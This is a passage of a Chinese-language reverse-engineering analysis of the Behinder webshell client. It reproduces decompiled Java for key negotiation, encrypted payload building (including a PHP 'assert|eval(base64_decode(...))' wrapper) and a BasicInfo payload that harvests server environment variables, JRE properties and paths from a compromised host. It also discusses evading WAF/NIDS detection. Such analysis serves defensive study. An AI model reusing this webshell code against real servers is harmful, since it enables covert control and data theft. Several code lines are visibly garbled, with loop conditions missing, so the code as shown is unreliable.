            return result;
        }
    }
上面虽然获取了rawKey_1以及是rawKey_1和rawKey_2异或之后的temp字节数组，但是实际上最终的finalKey其实都是使用rawKey_2，temp数组只是用来控制循环的结束条件。每一次循环，都会重新获取rawKey_2，重新和rawKey_1异或生成temp字节数组，其中temp字节数组会在两个循环里面控制start和end变量的值，当end-start==16时，结束循环，并返回最新获取的rawKey_2作为finalKey。
    String rawKey_1 = sb.toString();
    String pattern = "[a-fA-F0-9]{16}";
    Pattern r = Pattern.compile(pattern);
    Matcher m = r.matcher(rawKey_1);
    if (!m.find()) {
        throw new Exception("页面存在，但是无法获取密钥!");
    } else {
        int start = 0;
        int end = 0;
        int cycleCount = 0;
        while(true) {
            Map KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
            String rawKey_2 = (String)KeyAndCookie.get("key");
            byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
            int i;
            for(i = 0; i  0) {
                    if (start == 0 || i = 0; --i) {
                if (temp[i] > 0) {
                    if (i >= end) {
                        end = i + 1;
                    }
                    break;
                }
            }
            if (end - start == 16) {
                result.put("cookie", (String)KeyAndCookie.get("cookie"));
                result.put("beginIndex", String.valueOf(start));
                result.put("endIndex", String.valueOf(temp.length - end));
                String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
                result.put("key", finalKey);
                return result;
            }
            if (cycleCount > 10) {
                throw new Exception("Can't figure out the key!");
            }
            ++cycleCount;
        }
返回的finalKey就是循环最后一轮获取的rawKey_2，所以rawKey_1和temp字节数组对于最终的finalKey来说其实并没有用到。我目前的一个猜测是动态控制请求服务端获取key的次数，不固定向服务端请求密匙的次数，以此来绕过waf或nids的一些检测特征，但是其实waf或者nids将同一个会话服务端向客户端返回的可疑的128位随机数保存，然后取最后一次保存的128位随机数作为这个会话的通讯密匙，然后解密这个会话的通讯内容，如果可以成功解密和进行base64解码，那么就可以判断明文内容是不是触发检测规则。
返回到ShellService之后会获取之后会获取返回结果里面的cookie和key，在之后的请求里面都会使用这个cookie和key。
    Map keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
    String cookie = (String)keyAndCookie.get("cookie");
    if ((cookie == null || cookie.equals("")) && !this.currentHeaders.containsKey("cookie")) {
        String urlWithSession = (String)keyAndCookie.get("urlWithSession");
        if (urlWithSession != null) {
            this.currentUrl = urlWithSession;
        }
        this.currentKey = (String)Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get("key");
    } else {
        this.mergeCookie(this.currentHeaders, cookie);
        this.currentKey = (String)keyAndCookie.get("key");
        if (this.currentType.equals("php") || this.currentType.equals("aspx")) {
            this.beginIndex = Integer.parseInt((String)keyAndCookie.get("beginIndex"));
            this.endIndex = Integer.parseInt((String)keyAndCookie.get("endIndex"));
        }
    }
至此，getKeyAndCookie部分执行完成。下面将以getBasicInfo和runCMD为例分析如何使用这个cookie和key。
# 0x04 获取服务器基本信息 getBasicInfo
在获取了cookie和key之后，BasicInfoUtil的getBasicInfo就会调用ShellService的getBasicInfo方法来获取放了木马的服务器的基本信息。
`JSONObject basicInfoObj = new
JSONObject(mainShell.currentShellService.getBasicInfo());`
在ShellService的getBasicInfo里，会调用Utils.getData方法和Utils.requestAndParse方法，其中，getData方法是使用key加密要执行的代码的class字节数组，并进行base64编码；而requestAndParse则是使用带有获取的cookie的请求头来postgetData得到的加密和编码过后的字节数组，并获取返回信息。
    public String getBasicInfo() throws Exception {
        String result = "";
        Map params = new LinkedHashMap();
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
        Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        try {
            result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
            return result;
        } catch (Exception var7) {
            var7.printStackTrace();
            throw new Exception("请求失败:" + new String(resData, "UTF-8"));
        }
    }
进入Utils.getData方法，会调用net.rebeyond.behinder.core.Params里面的getParamedClass方法，传入BasicInfo参数，使用ASM框架来动态修改class文件中的属性值，详细可参考
这篇文章
    public static byte[] getData(String key, int encryptType, String className, Map params, String type) throws Exception {
        return getData(key, encryptType, className, params, type, (byte[])null);
    }
    public static byte[] getData(String key, int encryptType, String className, Map params, String type, byte[] extraData) throws Exception {
        byte[] bincls;
        byte[] encrypedBincls;
        if (type.equals("jsp")) {
            className = "net.rebeyond.behinder.payload.java." + className;
            bincls = Params.getParamedClass(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }
            encrypedBincls = Crypt.Encrypt(bincls, key);
            String basedEncryBincls = Base64.encode(encrypedBincls);
            return basedEncryBincls.getBytes();
        } else if (type.equals("php")) {
            bincls = Params.getParamedPhp(className, params);
            bincls = Base64.encode(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }
            encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return Base64.encode(encrypedBincls).getBytes();
        } else if (type.equals("aspx")) {
            bincls = Params.getParamedAssembly(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }
            encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
            return encrypedBincls;
        } else if (type.equals("asp")) {
            bincls = Params.getParamedAsp(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }
            encrypedBincls = Crypt.EncryptForAsp(bincls, key);
            return encrypedBincls;
        } else {
            return null;
        }
    }
我们来关注传入去Param的参数BasicInfo这个类的代码，这个类就是要在放了木马的服务器上执行的payload，这里必须提醒一句，在服务端上的木马在使用ClassLoader来实例化接收回来的class字节数组之后，就会调用equals方法，同时传入Pagecontext对象来使payload获取到session，request，response对象，然后才是获取服务器上面的环境变量，jre参数，当前路径等信息
    public boolean equals(Object obj) {
            PageContext page = (PageContext)obj;
            page.getResponse().setCharacterEncoding("UTF-8");
            String result = "";
            try {
                StringBuilder basicInfo = new StringBuilder("环境变量:");
                Map env = System.getenv();
                Iterator var7 = env.keySet().iterator();
                while(var7.hasNext()) {
                    String name = (String)var7.next();
                    basicInfo.append(name + "=" + (String)env.get(name) + "");
                }
                basicInfo.append("JRE系统属性:");
                Properties props = System.getProperties();
                Set> entrySet = props.entrySet();
                Iterator var9 = entrySet.iterator();
                while(var9.hasNext()) {
                    Entry entry = (Entry)var9.next();
                    basicInfo.append(entry.getKey() + " = " + entry.getValue() + "");
                }
                String currentPath = (new File("")).getAbsolutePath();
                String driveList = "";
                File[] roots = File.listRoots();
                File[] var14 = roots;
                int var13 = roots.length;
                for(int var12 = 0; var12  entity = new HashMap();
                entity.put("basicInfo", basicInfo.toString());
                entity.put("currentPath", currentPath);
                entity.put("driveList", driveList);
                entity.put("osInfo", osInfo);
                result = this.buildJson(entity, true);
                String key = page.getSession().getAttribute("u").toString();
                ServletOutputStream so = page.getResponse().getOutputStream();
                so.write(Encrypt(result.getBytes(), key));
                so.flush();
                so.close();
                page.getOut().clear();
            } catch (Exception var15) {
                var15.printStackTrace();
            }
            return true;
        }
BasicInfo类里对拿到的信息进行base64编码并转换成json格式
    private String buildJson(Map entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        Iterator var6 = entity.keySet().iterator();
        while(var6.hasNext()) {
            String key = (String)var6.next();
            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
然后对json数据进行加密,并把数据返回给客户端
    public static byte[] Encrypt(byte[] bs, String key) throws Exception {
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
这里再提醒一次，上面BasicInfo是放在服务器上执行的payload，是在放了木马的服务器上执行的，不是运行客户端的电脑执行的，获取到服务器的信息就加密和编码，再返回给客户端。客户端的Utils.getData将这个basicInfo的payload借助Params类来动态生成字节数组，然后再对字节数组加密和base64编码，然后返回。
    public static byte[] getData(String key, int encryptType, String className, Map params, String type, byte[] extraData) throws Exception {
        byte[] bincls;
        byte[] encrypedBincls;
        if (type.equals("jsp")) {
            className = "net.rebeyond.behinder.payload.java." + className;
            bincls = Params.getParamedClass(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }
            encrypedBincls = Crypt.Encrypt(bincls, key);